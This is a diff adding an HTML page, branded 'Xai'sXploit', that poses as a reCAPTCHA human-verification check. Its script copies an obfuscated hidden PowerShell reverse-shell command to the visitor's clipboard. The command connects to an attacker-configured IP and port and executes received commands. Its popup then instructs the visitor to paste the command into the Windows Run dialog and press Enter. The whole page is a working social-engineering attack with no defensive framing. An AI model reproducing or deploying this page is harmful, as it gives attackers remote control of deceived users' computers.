@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="X.jpg" type="image/x-icon">
+    <title>Xai'sXploit</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff; /* White background for the body */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Prevents overflow */
+        }
+
+        .background {
+    background-image: url('bg.jpg'); /* Background image */
+    background-color: #ffffff; /* White background as fallback */
+    background-size: cover; /* Make sure the image covers the entire area */
+    background-position: center; /* Center the image */
+    width: 100%;
+    height: 100%;
+    position: absolute; /* Makes it cover the entire body */
+    top: 0;
+    left: 0;
+    filter: blur(10px); /* Apply a blur effect */
+}
+
+        .container {
+            text-align: center;
+            width: 350px; /* Fixed width */
+            height: 250px; /* Fixed height */
+            background-color: rgba(249, 249, 249, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            overflow: hidden; /* Prevents overflow inside container */
+            position: relative; /* Allows positioning of elements inside */
+        }
+
+        h1 {
+            font-size: 30px;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #f9f9f9;
+            padding: 10px 20px;
+            border: 1px solid #d6d6d6;
+            border-radius: 5px;
+            width: 100%;
+            height: 75px;
+            box-sizing: border-box; /* Prevents stretching */
+        }
+
+        .checkbox {
+            width: 30px;
+            height: 30px;
+            border: 2px solid #ccc;
+            border-radius: 3px;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .checkbox.checked {
+            background-color: #fff;
+        }
+
+        .checkbox.checked .loading {
+            display: block;
+        }
+
+        .loading {
+            width: 18px;
+            height: 18px;
+            border: 4px solid #007bff;
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none; /* Hidden by default */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .captcha-text {
+            font-size: 17px;
+            color: #333;
+            text-align: left;
+            display: inline-block;
+            margin-left: -100px;
+        }
+
+        .captcha-logo {
+            font-size: 10px;
+            color: #999;
+            display: flex;
+            align-items: center;
+            margin-top: 40px;            
+        }
+
+        .captcha-logo img {
+            width: 35px;
+            height: 35px;
+            margin-right: -46px;
+            margin-top: -60px;
+        }
+        
+         .haha {
+            color: #999;
+            display: inline-block;
+            margin-right: -10px;
+            line-height: 1;
+        }
+        
+
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;            
+            background: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            z-index: 1000;
+            width: 250px;
+            padding-bottom: 6px;
+        }
+        
+        .header {
+            margin-left: -15px;
+            margin-top: -15px;
+            margin-right: -15px;
+            color: white;
+            height: 50px;
+            background-color: #007bff;
+            width: auto;
+            text-align: left;
+            padding: 20px;
+        }
+        
+        
+        .steps-container {
+            margin-left: -15px;
+            margin-top: -10px;
+            margin-right: -15px;
+            background-color: #f0f0f0;
+            padding: 10px;
+            height: 230px;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        .popup.active {
+            display: block;
+        }
+
+        .popup button {
+            padding: 10px 30px;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+            margin-right: -185px;
+        }
+        
+        .icon img {
+            position: absolute; /* Allows you to move the icon freely */
+            width: 25px;
+            height: 25px;
+            margin-left: -130px; /* Adjust the horizontal position */
+            margin-top: -10%;
+            cursor: pointer;
+        }
+
+        .popup button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Tooltip styles */
+        .tooltip {
+            display: none;
+            position: absolute;
+            background-color: #333;
+            color: #fff;
+            padding: 5px;
+            border-radius: 5px;
+            font-size: 12px;
+            bottom: 35px;
+            left: 10px;
+            width: 200px;
+            text-align: center;
+        }
+
+        .icon:hover .tooltip {
+            display: block;
+        }
+
+        /* Error Popup */
+        .error-popup {
+            font-size: 13px;
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 10px 50px;
+            background: #f8d7da;
+            border: 1px solid red;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            z-index: 1000;
+            width: 150px;
+        }
+
+        .error-popup.active {
+            display: block;
+        }
+        
+.header2 {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  width: 100%;
+  background-color: rgba(249, 249, 249, 0.8);
+  display: flex;
+  align-items: center;
+  padding: 20px 40px;
+  font-family: Arial, sans-serif;
+  font-size: 15px;
+  color: #333;
+  z-index: 9999;
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+}
+
+.logo-frame {
+  display: inline-block;
+  margin-right: 20px;
+}
+
+.logo-frame img {
+  height: 50px;
+  width: auto;
+  border-radius: 5px;
+}
+.footer2 {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  width: 100%;
+  background-color: rgba(249, 249, 249, 0.8);
+  text-align: center;
+  padding: 10px 0;
+  font-family: Arial, sans-serif;
+  font-size: 14px;
+  color: #333;
+  z-index: 9999;
+  box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.05);
+}
+
+#mobile-warning {
+  display: none;
+  position: fixed;
+  z-index: 10000;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: white;
+  color: #000;
+  text-align: center;
+  padding-top: 30%;
+  font-size: 18px;
+  font-family: Arial, sans-serif;
+}
+    </style>
+</head>
+<body>
+    
+    <div id="mobile-warning">
+  <p>This website is only available on desktop or laptop devices.</p>
+</div>
+    
+    <div class="background"></div> <!-- White background behind everything -->
+    
+    <header class="header2">
+  <a href="#" onclick="location.reload(); return false;" class="logo-frame">
+    <img src="X.jpg" alt="Logo">
+  </a>
+  <h1><b><i>Xai'sXploit</i></b> — Lightweight. Lethal. Undetected.</h1>
+</header>
+    
+    <div class="container">
+        <h1>Verify You Are Human</h1>
+        <p>Please verify that you are a human to continue</p>
+
+        <div class="captcha-container">
+            <div class="checkbox" id="captchaCheckbox">
+                <div class="loading" id="loading"></div>
+            </div>
+            <span class="captcha-text">I'm not a robot</span>
+            <div class="captcha-logo">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
+                <span class="haha" style="font-size: 10px;">reCAPTCHA<br><span style="font-size: 8px;">Privacy - Terms</span></span>
+            </div>
+        </div>
+
+        <div class="popup" id="popup">
+            <p class="header">Complete these<br><b style="font-size: 29px;"> Verification Steps</b></p>
+            <div class="steps-container">
+                <p><b>To better prove you are not a robot, please:</b></p>
+<p><span style="color: #007bff; font-weight: bold;">1.</span> Press & hold the <b>Windows Button " </b><i class="fab fa-windows"></i><b> " + R.</b></p>
+<p><span style="color: #007bff; font-weight: bold;">2.</span> In the verification window, press <b>Ctrl + V.</b></p>
+<p><span style="color: #007bff; font-weight: bold;">3.</span> Press <b>Enter</b> on your keyboard to finish.</p>
+            </div>
+            <button onclick="handleDoneButton()"><b>DONE</b></button>
+            <div class="icon">
+                <img src="info.png" alt="info icon">
+                <div class="tooltip">This CAPTCHA proves you're not a robot.</div>
+            </div>
+        </div>
+
+        <!-- Error popup -->
+        <div class="error-popup" id="errorPopup">
+            <p><b>Error, please follow the steps<br> and try again!</b></p>
+        </div>
+    </div>
+    
+    <footer class="footer2">
+  <p>&copy; 2025 <i>Xai'sXploit</i>. All rights reserved.</p>
+</footer>
+
+    <script src="config.js"></script>
+    <script>
+        
+      if (window.innerWidth <= 768) {
+    document.getElementById("mobile-warning").style.display = "block";
+    document.body.style.overflow = "hidden";
+      }
+  
+    const checkbox = document.getElementById('captchaCheckbox');
+    const loading = document.getElementById('loading');
+    const popup = document.getElementById('popup');
+    const errorPopup = document.getElementById('errorPopup');
+    let doneButtonPressCount = 0; // Counter to track number of presses on "DONE" button
+
+// Load clipboardText from config
+checkbox.addEventListener('click', () => {
+    checkbox.classList.toggle('checked');
+    if (checkbox.classList.contains('checked')) {
+        loading.style.display = 'block'; // Show loading
+        setTimeout(() => {
+            // Generate the PowerShell reverse shell command dynamically
+            const payload = `powershell -w hidden -noni -nop -c "\$c=New-Object Net.Sockets.TCPClient('${CONFIG.ip}',${CONFIG.port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i); \$sb=(iex \$d 2>&1 | Out-String ); \$sb2=\$sb + 'PS ' + (pwd).Path + '> '; \$s.Write(([text.encoding]::ASCII).GetBytes(\$sb2),0,\$sb2.Length);\$s.Flush()}\"`;
+
+            // Copy the dynamically generated payload to clipboard
+            navigator.clipboard.writeText(payload).then(() => {
+                popup.classList.add('active');
+            });
+            loading.style.display = 'none'; // Hide loading
+        }, 2000); // Delay for loading animation
+    } else {
+        loading.style.display = 'none';
+    }
+});
+
+    // DONE button handler
+    function handleDoneButton() {
+        doneButtonPressCount++; // Increment the press counter
+
+        loading.style.display = 'block'; // Show loading animation
+        setTimeout(() => {
+            loading.style.display = 'none'; // Hide loading animation
+
+            if (doneButtonPressCount === 1) {
+                // Show the error popup on the first press
+                errorPopup.classList.add('active');
+                setTimeout(() => {
+                    errorPopup.classList.remove('active'); // Hide error after a few seconds
+                }, 3000); // Error stays for 3 seconds
+            } else if (doneButtonPressCount === 2) {
+                // Redirect to the website on the second press
+                window.location.href = "phase2.html";
+            }
+        }, 2000); // Simulate a 2-second delay for the loading animation
+    }
+    </script>
+</body>
+</html>
